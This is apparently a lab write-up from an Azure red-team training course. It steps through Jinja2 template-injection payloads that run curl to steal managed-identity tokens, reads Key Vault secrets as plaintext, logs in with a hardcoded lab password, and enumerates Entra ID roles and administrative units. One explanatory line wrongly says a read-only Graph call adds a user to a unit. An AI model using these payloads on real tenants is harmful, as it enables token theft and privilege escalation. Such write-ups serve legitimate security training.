## Objective 16 ***Part of - Kill Chain - 2***

```
- Abuse the permissions that Managed Identity of the 'vaultfrontend' App Service has to extract secrets from a key vault.
- Use the secrets to gather more information from the defcorphq tenant
```
- We already enumerated that the managed identity of the 'vaultfrontend' app service (https://vaultfrontend.azurewebsites.net) can access the keyvault 'ResearchKeyVault'. 

  To be able to access the keyvault, we need to **request a keyvault access token**. Use the following code in the web app for that:
  ```python
  {% for x in ().__class__.__mro__[1].__subclasses__() %}
    {% if "Popen" in x.__name__ %}
      {{x('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER',shell=True,stdout=-
  1).communicate()}}
    {% endif %}
  {% endfor %}
  ```


  **Request a new ARM access token** using the below command:
  ```python
  {% for x in ().__class__.__mro__[1].__subclasses__() %}
    {% if "Popen" in x.__name__ %}
      {{x('curl
  "$IDENTITY_ENDPOINT?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER',shell=True,stdout=-
  1).communicate()}}
    {% endif %}
  {% endfor %}
  ```

- Connect using Az PowerShell and use both the **arm token** and **keyvault token:**
  ```powershell
  $token = 'eyJ0..'
  $keyvaulttoken = 'eyJ0..'
  Connect-AzAccount -AccessToken $token -AccountId 2e91a4fea0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken
  ```

- Check if we can **access the keyvault** and possible any secrets, keys or credentials:
  ```powershell
  Get-AzKeyVault
  Get-AzKeyVaultSecret -VaultName ResearchKeyVault
  Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader â€“AsPlainText
  ```
  ![test](/img/obj16.png "Enumeration")

- Let's see what Azure resources the user Kathy has access to.
  Authenticate as Kathy and enumerate resources the user can access.
  ```powershell
  $password = ConvertTo-SecureString 'Gaxu@6991TEST$#*!@#' -AsPlainText -Force
  $creds = New-Object System.Management.Automation.PSCredential('kathynschaefer@defcorphq.onmicrosoft.com', $password)
  Connect-AzAccount -Credential $creds

  Get-AzResource
  ```
  ![test](/img/obj16a.png "Enumeration")

- Let's enumerate role assignments on the VM 'jumpvm':
  ```powershell
  Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm
  ```
  So there is a group 'VM admins' that has the Virtual Machine Command Executor role on the jumpvm VM
  ![test](/img/obj16b.png "Enumeration")

- Let's check the definition of this role to understand the allowed actions:
  ```powershell
  Get-AzRoleDefinition -Name "Virtual Machine Command Executor"
  ```
  ![test](/img/obj16c.png "Enumeration")
- Let's get some information about the VM admins group and its membership:
  ```powershell
  Get-AzADGroup -DisplayName 'VM Admins'
  Get-AzADGroupMember -GroupDisplayName 'VM Admins' | select UserPrincipalName
  ```
  ![test](/img/obj16d.png "Enumeration")

- For VMContributorx@defcorphq.onmicrosoft.com list the groups and roles that the user is a member of! We will use the Graph API to get all the details and not Az PowerShell. 

Run the below command to get an **access token for Graph API:**

```powershell
(Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
```

Now, use the token with the below code:
In this manuel API call will add to **VMContributorX@defcorphq.onmicrosoft.com** user to an administrative unit 'Control Group'.
```powershell
$Token = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
$URI = 'https://graph.microsoft.com/v1.0/users/VMContributorX@defcorphq.onmicrosoft.com/memberOf'

$RequestParams = @{
  Method = 'GET'
  Uri = $URI
  Headers = @{
    'Authorization' = "Bearer $Token"
    }
}
(Invoke-RestMethod @RequestParams).value
```
![test](/img/obj16f.png "Enumeration")

- Get information and membership of this administrative unit using Azure AD module. We are using Kathy's credentials below:
```powershell
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
Connect-AzureAD -Credential $creds
Get-AzureADMSAdministrativeUnit -Id e1e26d93-163e-42a2-a46e-1b7d52626395
Get-AzureADMSAdministrativeUnitMember -Id e1e26d93-163e42a2-a46e-1b7d52626395
```
![test](/img/obj16e.png "Enumeration")
- The VM Admins group is a member of the administrative unit. Let's check for any roles scoped to this administrative unit:
![test](/img/obj16g.png "Enumeration")
```powershell
Get-AzureADMSScopedRoleMembership -Id e1e26d93-163e-42a2-a46e-1b7d52626395 | fl *
```


- Let's check the role using the RoleId we got above:
```powershell
 Get-AzureADDirectoryRole -ObjectId 5b3935ed-b52d-4080-8b05-3a1832194d3a
 ```
 ![test](/img/obj16h.png "Enumeration")




